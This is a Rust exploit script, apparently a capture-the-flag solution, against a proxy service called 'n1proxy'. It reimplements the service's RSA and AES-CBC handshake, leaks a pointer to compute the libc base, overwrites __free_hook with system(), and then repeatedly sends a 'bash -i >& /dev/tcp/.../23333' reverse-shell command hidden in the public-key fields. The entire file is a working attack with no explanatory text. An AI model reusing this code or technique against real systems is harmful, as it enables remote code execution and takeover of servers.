use aes::cipher::block_padding::Pkcs7;
use aes::cipher::generic_array::GenericArray;
use aes::cipher::typenum::U16;
use aes::cipher::typenum::U32;
use aes::cipher::BlockDecryptMut;
use aes::cipher::BlockEncryptMut;
use aes::cipher::KeyIvInit;
use aes::Aes256;
use anyhow::anyhow;
use anyhow::Error;
use anyhow::Result;
use cbc::Decryptor;
use cbc::Encryptor;
use rand::thread_rng;
use rand::Rng;
use rsa::pkcs1v15;
use rsa::signature::SignatureEncoding;
use rsa::signature::Signer;
use rsa::traits::PublicKeyParts;
use rsa::BigUint;
use rsa::Pkcs1v15Encrypt;
use rsa::RsaPrivateKey;
use rsa::RsaPublicKey;
use sha2::Sha256;
use std::env;
use std::io::Read;
use std::io::Write;
use std::net::TcpStream;
use std::thread;
use std::thread::sleep;
use std::time;

type Aes256CbcEnc = Encryptor<Aes256>;
type Aes256CbcDec = Decryptor<Aes256>;

const HELLO_MSG: &str = "n1proxy server v0.1";
const CLIENT_HELLO: &str = "n1proxy client v0.1";

const KEY_BITS: usize = 4096;

#[derive(Debug, Clone)]
struct SessionKey {
    key: Vec<u8>,
    iv: Vec<u8>,
}

#[derive(Debug)]
#[allow(dead_code)]
enum ConnType {
    New = 0,
    Restore = 1,
    Renew = 2,
    Unknown = 3,
}

impl ConnType {
    pub fn to_le_bytes(&self) -> Vec<u8> {
        match self {
            ConnType::New => 0u32.to_le_bytes().to_vec(),
            ConnType::Restore => 1u32.to_le_bytes().to_vec(),
            ConnType::Renew => 2u32.to_le_bytes().to_vec(),
            ConnType::Unknown => 3u32.to_le_bytes().to_vec(),
        }
    }
}
#[derive(Debug)]
#[allow(dead_code)]
enum ProxyType {
    Tcp = 0,
    Udp = 1,
    Sock = 2,
    Unknown = 3,
}
#[derive(Debug)]
#[allow(dead_code)]
enum ProxyStatus {
    Send = 0,
    Recv = 1,
    Conn = 2,
    Close = 3,
    Listen = 4,
    Unknown = 5,
}

impl ProxyType {
    pub fn to_le_bytes(&self) -> Vec<u8> {
        match self {
            ProxyType::Tcp => 0u32.to_le_bytes().to_vec(),
            ProxyType::Udp => 1u32.to_le_bytes().to_vec(),
            ProxyType::Sock => 2u32.to_le_bytes().to_vec(),
            ProxyType::Unknown => 3u32.to_le_bytes().to_vec(),
        }
    }
}

impl ProxyStatus {
    pub fn to_le_bytes(&self) -> Vec<u8> {
        match self {
            ProxyStatus::Send => 0u32.to_le_bytes().to_vec(),
            ProxyStatus::Recv => 1u32.to_le_bytes().to_vec(),
            ProxyStatus::Conn => 2u32.to_le_bytes().to_vec(),
            ProxyStatus::Close => 3u32.to_le_bytes().to_vec(),
            ProxyStatus::Listen => 4u32.to_le_bytes().to_vec(),
            ProxyStatus::Unknown => 5u32.to_le_bytes().to_vec(),
        }
    }
}

fn session_dec(keys: SessionKey, msg: &[u8]) -> Result<Vec<u8>> {
    if msg.len() % 16 != 0 {
        return Err(anyhow!("Invalid message length"));
    }

    let key = GenericArray::<_, U32>::from_slice(
        keys.key
            .get(0..32)
            .ok_or_else(|| anyhow!("Invalid key length {}", keys.key.len()))?,
    );
    let iv = GenericArray::<_, U16>::from_slice(
        keys.iv
            .get(0..16)
            .ok_or_else(|| anyhow!("Invalid iv length {}", keys.iv.len()))?,
    );
    let mut msg = msg.to_vec();

    let dec = match Aes256CbcDec::new(key, iv).decrypt_padded_mut::<Pkcs7>(&mut msg) {
        Ok(dec) => dec,
        Err(err) => return Err(anyhow!("Failed to decrypt message {}", err)),
    };

    Ok(dec.to_vec())
}

fn session_enc(keys: SessionKey, msg: &[u8]) -> Result<Vec<u8>> {
    let key = GenericArray::<_, U32>::from_slice(
        keys.key
            .get(0..32)
            .ok_or_else(|| anyhow!("Invalid key length {}", keys.key.len()))?,
    );
    let iv = GenericArray::<_, U16>::from_slice(
        keys.iv
            .get(0..16)
            .ok_or_else(|| anyhow!("Invalid iv length {}", keys.iv.len()))?,
    );
    let mut msg = msg.to_vec();
    let msg_len = msg.len();
    let padding_len = (16 - (msg_len % 16)) % 16;
    msg.extend(vec![padding_len as u8; padding_len]);

    let enc = match Aes256CbcEnc::new(key, iv).encrypt_padded_mut::<Pkcs7>(&mut msg, msg_len) {
        Ok(enc) => enc,
        Err(err) => return Err(anyhow!("Failed to encrypt message {}", err)),
    };

    Ok(enc.to_vec())
}
struct Server {
    pub ip: String,
    pub port: u16,
    pub priv_key: RsaPrivateKey,
    pub session_keys: SessionKey,
    pub is_auth: bool,
    pub server_pub_key: RsaPublicKey,
    pub so_type: ProxyType,
}

impl Server {
    pub fn new(ip: &str, port: u16, so_type: ProxyType) -> Self {
        let mut rng = rand::thread_rng();
        let priv_key = RsaPrivateKey::new(&mut rng, KEY_BITS).expect("failed to generate a key");
        Self {
            ip: ip.to_string(),
            port,
            priv_key: priv_key.clone(),
            session_keys: SessionKey {
                key: vec![0; 32],
                iv: vec![0; 32],
            },
            is_auth: false,
            server_pub_key: RsaPublicKey::from(priv_key),
            so_type,
        }
    }

    fn skip_msg(&self, stream: &mut TcpStream) {
        println!("skip msg");
        let mut msg_len = vec![0; 8];
        stream.read(&mut msg_len).ok();
        let server_random_len = u64::from_le_bytes(match msg_len.try_into() {
            Ok(data) => data,
            Err(_) => panic!("Invalid server random len"),
        });

        let mut server_random = vec![0; server_random_len as usize];
        stream.read(&mut server_random).ok();
        println!("skip msg len {} fin", server_random_len);
    }

    fn prev_auth(&mut self, stream: &mut TcpStream) -> Result<()> {
        let mut hello = vec![0u8; HELLO_MSG.len()];
        stream.read(&mut hello)?;

        let mut client_hello = vec![];
        client_hello.extend_from_slice(CLIENT_HELLO.as_bytes());

        match self.is_auth {
            false => {
                client_hello.extend_from_slice(&ConnType::New.to_le_bytes());
            }
            true => {
                client_hello.extend_from_slice(&ConnType::Restore.to_le_bytes());
            }
        };

        stream.write_all(&client_hello)?;
        stream.flush()?;

        self.skip_msg(stream);

        let mut n_size = vec![0; 8];
        stream.read(&mut n_size)?;
        let mut e_size = vec![0; 8];
        stream.read(&mut e_size)?;

        let n_size = u64::from_le_bytes(match n_size.try_into() {
            Ok(data) => data,
            Err(_) => return Err(anyhow!("Invalid n size")),
        });
        let e_size = u64::from_le_bytes(match e_size.try_into() {
            Ok(data) => data,
            Err(_) => return Err(anyhow!("Invalid e size")),
        });

        let mut n = vec![0; n_size as usize];
        stream.read(&mut n)?;
        let mut e = vec![0; e_size as usize];
        stream.read(&mut e)?;

        let n = BigUint::from_bytes_be(&n);
        let e = BigUint::from_bytes_be(&e);

        let pub_key = RsaPublicKey::new(n, e).expect("failed to generate a key");

        self.server_pub_key = pub_key;

        let client_pub_key = RsaPublicKey::from(&self.priv_key);

        let client_pub_key_n = client_pub_key.n().to_bytes_be();
        let client_pub_key_e = client_pub_key.e().to_bytes_be();
        let client_verify = vec![
            client_pub_key_n.len().to_le_bytes().to_vec(),
            client_pub_key_n,
            client_pub_key_e.len().to_le_bytes().to_vec(),
            client_pub_key_e,
        ]
        .concat();

        let client_verify_key = pkcs1v15::SigningKey::<Sha256>::new(self.priv_key.clone());
        let client_verify_sign = client_verify_key.sign(&client_verify).to_vec();

        let client_verify = vec![
            client_verify_sign.len().to_le_bytes().to_vec(),
            client_verify_sign,
            client_verify,
        ]
        .concat();
        stream.write_all(&client_verify)?;

        // read sign
        self.skip_msg(stream);

        let mut server_random_len = vec![0; 8];
        stream.read(&mut server_random_len)?;
        let server_random_len = u64::from_le_bytes(match server_random_len.try_into() {
            Ok(data) => data,
            Err(_) => return Err(anyhow!("Invalid server random len")),
        });

        let mut server_random = vec![0; server_random_len as usize];
        stream.read(&mut server_random)?;

        let res = self.priv_key.decrypt(Pkcs1v15Encrypt, &server_random)?;

        self.session_keys = SessionKey {
            key: res[0..32].to_vec(),
            iv: res[32..48].to_vec(),
        };

        println!("session key: {:?}", self.session_keys);

        // read time
        // unused
        self.skip_msg(stream);

        Ok(())
    }

    pub fn new_stream(&mut self, target_host: &str, target_port: u16) -> Result<i32> {
        let mut stream = TcpStream::connect(format!("{}:{}", self.ip, self.port))?;
        self.prev_auth(&mut stream)?;

        println!("auth ok, create {:?} stream", self.so_type);
        let pre_conn = vec![self.so_type.to_le_bytes(), ProxyStatus::Conn.to_le_bytes()].concat();

        let client_verify_key = pkcs1v15::SigningKey::<Sha256>::new(self.priv_key.clone());
        let client_verify_sign = client_verify_key.sign(&pre_conn).to_vec();
        println!("client verify sign: {:?}", client_verify_sign.len());
        let pre_conn = vec![pre_conn, client_verify_sign].concat();
        let enc_msg = session_enc(self.session_keys.clone(), &pre_conn)?;
        stream.write_all(&enc_msg)?;

        let mut ok_msg = vec![0u8; 1024];
        let sz = stream.read(&mut ok_msg)?;
        ok_msg.truncate(sz);
        let ok_msg = session_dec(self.session_keys.clone(), &ok_msg)?;
        println!("ok msg: {:?}", ok_msg[0..4].to_vec());

        let conn_msg = [
            (target_host.len() as u32).to_le_bytes().to_vec(),
            target_host.as_bytes().to_vec(),
            target_port.to_le_bytes().to_vec(),
        ]
        .concat();

        let client_verify_sign = client_verify_key.sign(&conn_msg).to_vec();

        let conn_msg = vec![conn_msg, client_verify_sign].concat();
        let enc_msg = session_enc(self.session_keys.clone(), &conn_msg)?;
        stream.write_all(&enc_msg)?;

        // recv fd

        let mut fd_msg = vec![0u8; 1024];
        let sz = stream.read(&mut fd_msg)?;
        fd_msg.truncate(sz);
        let fd_msg = session_dec(self.session_keys.clone(), &fd_msg)?;
        println!("fd msg: {:?}", fd_msg[0..4].to_vec());

        Ok(i32::from_le_bytes(fd_msg[0..4].try_into()?))
    }

    fn send_data(&mut self, fd: i32, data: &[u8]) -> Result<usize> {
        let mut stream = TcpStream::connect(format!("{}:{}", self.ip, self.port))?;
        self.prev_auth(&mut stream)?;

        println!("auth ok, send stream");
        let pre_conn = vec![self.so_type.to_le_bytes(), ProxyStatus::Send.to_le_bytes()].concat();

        let client_verify_key = pkcs1v15::SigningKey::<Sha256>::new(self.priv_key.clone());
        let client_verify_sign = client_verify_key.sign(&pre_conn).to_vec();

        let pre_conn = vec![pre_conn, client_verify_sign].concat();
        let enc_msg = session_enc(self.session_keys.clone(), &pre_conn)?;
        stream.write_all(&enc_msg)?;

        let mut ok_msg = vec![0u8; 1024];
        let sz = stream.read(&mut ok_msg)?;
        ok_msg.truncate(sz);
        let ok_msg = session_dec(self.session_keys.clone(), &ok_msg)?;
        println!("ok msg: {:?}", ok_msg[0..4].to_vec());

        let conn_msg = [
            fd.to_le_bytes().to_vec(),
            data.len().to_le_bytes().to_vec(),
            data.to_vec(),
        ]
        .concat();

        let client_verify_sign = client_verify_key.sign(&conn_msg).to_vec();

        let conn_msg = vec![conn_msg, client_verify_sign].concat();
        println!("client verify sign: {:?}", conn_msg.len());

        let enc_msg = session_enc(self.session_keys.clone(), &conn_msg)?;
        stream.write_all(&enc_msg)?;

        // recv res

        let mut fd_msg = vec![0u8; 1024];
        let sz = stream.read(&mut fd_msg)?;
        fd_msg.truncate(sz);
        let fd_msg = session_dec(self.session_keys.clone(), &fd_msg)?;
        println!("fd msg: {:?}", fd_msg[0..8].to_vec());
        Ok(usize::from_le_bytes(fd_msg[0..8].try_into()?))
    }

    fn recv_data(&mut self, fd: i32, recv_sz: usize) -> Result<Vec<u8>> {
        let mut stream = TcpStream::connect(format!("{}:{}", self.ip, self.port))?;
        self.prev_auth(&mut stream)?;

        println!("auth ok, recv stream");
        let pre_conn = vec![self.so_type.to_le_bytes(), ProxyStatus::Recv.to_le_bytes()].concat();

        let client_verify_key = pkcs1v15::SigningKey::<Sha256>::new(self.priv_key.clone());
        let client_verify_sign = client_verify_key.sign(&pre_conn).to_vec();

        let pre_conn = vec![pre_conn, client_verify_sign].concat();
        let enc_msg = session_enc(self.session_keys.clone(), &pre_conn)?;
        stream.write_all(&enc_msg)?;

        let mut ok_msg = vec![0u8; 1024];
        let sz = stream.read(&mut ok_msg)?;
        ok_msg.truncate(sz);
        let ok_msg = session_dec(self.session_keys.clone(), &ok_msg)?;
        println!("ok msg: {:?}", ok_msg[0..4].to_vec());

        let conn_msg = [fd.to_le_bytes().to_vec(), recv_sz.to_le_bytes().to_vec()].concat();

        let client_verify_sign = client_verify_key.sign(&conn_msg).to_vec();

        let conn_msg = vec![conn_msg, client_verify_sign].concat();
        println!("client verify sign: {:?}", conn_msg.len());

        let enc_msg = session_enc(self.session_keys.clone(), &conn_msg)?;
        stream.write_all(&enc_msg)?;

        // recv res
        let mut fd_msg = vec![0u8; (recv_sz / 16 + 1) * 16 + 1024];
        let sz = stream.read(&mut fd_msg)?;
        fd_msg.truncate(sz);
        let fd_msg = session_dec(self.session_keys.clone(), &fd_msg)?;
        let recv_len: usize = usize::from_le_bytes(fd_msg[0..8].try_into()?);
        Ok(fd_msg[8..(8 + recv_len)].to_vec())
    }

    fn listen_sock(&mut self, target_host: &str, target_port: u16) -> Result<i32> {
        let mut stream = TcpStream::connect(format!("{}:{}", self.ip, self.port))?;
        self.prev_auth(&mut stream)?;

        println!("auth ok, listen {:?} stream", self.so_type);
        let pre_conn = vec![
            self.so_type.to_le_bytes(),
            ProxyStatus::Listen.to_le_bytes(),
        ]
        .concat();

        let client_verify_key = pkcs1v15::SigningKey::<Sha256>::new(self.priv_key.clone());
        let client_verify_sign = client_verify_key.sign(&pre_conn).to_vec();
        println!("client verify sign: {:?}", client_verify_sign.len());
        let pre_conn = vec![pre_conn, client_verify_sign].concat();
        let enc_msg = session_enc(self.session_keys.clone(), &pre_conn)?;
        stream.write_all(&enc_msg)?;

        let mut ok_msg = vec![0u8; 1024];
        let sz = stream.read(&mut ok_msg)?;
        ok_msg.truncate(sz);
        let ok_msg = session_dec(self.session_keys.clone(), &ok_msg)?;
        println!("ok msg: {:?}", ok_msg[0..4].to_vec());

        let conn_msg = [
            (target_host.len() as u32).to_le_bytes().to_vec(),
            target_host.as_bytes().to_vec(),
            target_port.to_le_bytes().to_vec(),
        ]
        .concat();

        let client_verify_sign = client_verify_key.sign(&conn_msg).to_vec();

        let conn_msg = vec![conn_msg, client_verify_sign].concat();
        let enc_msg = session_enc(self.session_keys.clone(), &conn_msg)?;
        stream.write_all(&enc_msg)?;

        // recv fd

        let mut fd_msg = vec![0u8; 1024];
        let sz = stream.read(&mut fd_msg)?;
        fd_msg.truncate(sz);
        let fd_msg = session_dec(self.session_keys.clone(), &fd_msg)?;
        println!("fd msg: {:?}", fd_msg[0..4].to_vec());

        Ok(i32::from_le_bytes(fd_msg[0..4].try_into()?))
    }
}

fn main() -> Result<()> {
    let ip = env::args().nth(1).unwrap_or("127.0.0.1".to_string());
    let port = env::args()
        .nth(2)
        .unwrap_or("8080".to_string())
        .parse::<u16>()?;

    let reverse_shell = env::args().nth(3).unwrap_or("127.0.0.1".to_string());

    let ip2 = ip.clone();

    let t1 = thread::spawn(move || {
        let mut server = Server::new(&ip2, port, ProxyType::Sock);
        let fd1 = server.listen_sock("127.0.0.1", 23333)?;
        println!("fd1: {}", fd1);
        Ok::<(Server, i32), Error>((server, fd1))
    });

    let mut client = Server::new(&ip, port, ProxyType::Sock);

    // wait for server to start
    sleep(time::Duration::from_secs(10));
    let cfd1 = client.new_stream("127.0.0.1", 23333)?;
    println!("cfd1: {}", cfd1);
    let (mut server, fd1) = t1.join().unwrap()?;
    client.send_data(cfd1, "a".as_bytes())?;
    let res = server.recv_data(fd1, 0x400)?;

    // println!("res: {:?}", res);

    let leak1 = u64::from_le_bytes(res[0..8].try_into()?);
    println!("leak1: 0x{:x}", leak1);

    let libc_base = leak1 - 4111457;
    println!("libc_base: 0x{:x}", libc_base);

    let free_hook: u64 = libc_base + 0x3ED8E8;
    let sys_addr = libc_base + 0x4F420;

    let t2 = thread::spawn(move || {
        let fd1 = server.listen_sock("127.0.0.1", 23333)?;
        println!("fd1: {}", fd1);
        Ok::<(Server, i32), Error>((server, fd1))
    });
    sleep(time::Duration::from_secs(5));
    let cfd2 = client.new_stream("127.0.0.1", 23333)?;
    println!("cfd2: {}", cfd2);
    let (mut server, _) = t2.join().unwrap()?;

    let payload = vec![
        (free_hook - 0x10).to_le_bytes().to_vec(),
        sys_addr.to_le_bytes().to_vec(),
        sys_addr.to_le_bytes().to_vec(),
        sys_addr.to_le_bytes().to_vec(),
    ]
    .concat();

    client.send_data(cfd1, &payload)?;
    server.recv_data(fd1, 0x60)?;

    let binding = format!(
        "bash -c \"bash -i >& /dev/tcp/{}/23333 0>&1\"\x00;",
        reverse_shell
    ) + &"\x00".repeat(0x1000);
    let exec_cmd = binding.as_bytes();

    loop {
        let mut stream = TcpStream::connect(format!("{}:{}", ip, port))?;
        let mut hello = vec![0u8; HELLO_MSG.len()];
        stream.read(&mut hello)?;

        let mut client_hello = vec![];
        client_hello.extend_from_slice(CLIENT_HELLO.as_bytes());
        client_hello.extend_from_slice(&ConnType::New.to_le_bytes());

        stream.write_all(&client_hello)?;
        stream.flush()?;

        server.skip_msg(&mut stream);

        let mut n_size = vec![0; 8];
        stream.read(&mut n_size)?;
        let mut e_size = vec![0; 8];
        stream.read(&mut e_size)?;

        let n_size = u64::from_le_bytes(match n_size.try_into() {
            Ok(data) => data,
            Err(_) => return Err(anyhow!("Invalid n size")),
        });
        let e_size = u64::from_le_bytes(match e_size.try_into() {
            Ok(data) => data,
            Err(_) => return Err(anyhow!("Invalid e size")),
        });

        let mut n = vec![0; n_size as usize];
        stream.read(&mut n)?;
        let mut e = vec![0; e_size as usize];
        stream.read(&mut e)?;

        let client_pub_key_n = exec_cmd.to_vec();
        let client_pub_key_e = exec_cmd.to_vec();
        let client_verify = vec![
            client_pub_key_n.len().to_le_bytes().to_vec(),
            client_pub_key_n,
            client_pub_key_e.len().to_le_bytes().to_vec(),
            client_pub_key_e,
        ]
        .concat();
        stream.write_all(&client_verify)?;
        drop(stream);
    }
}
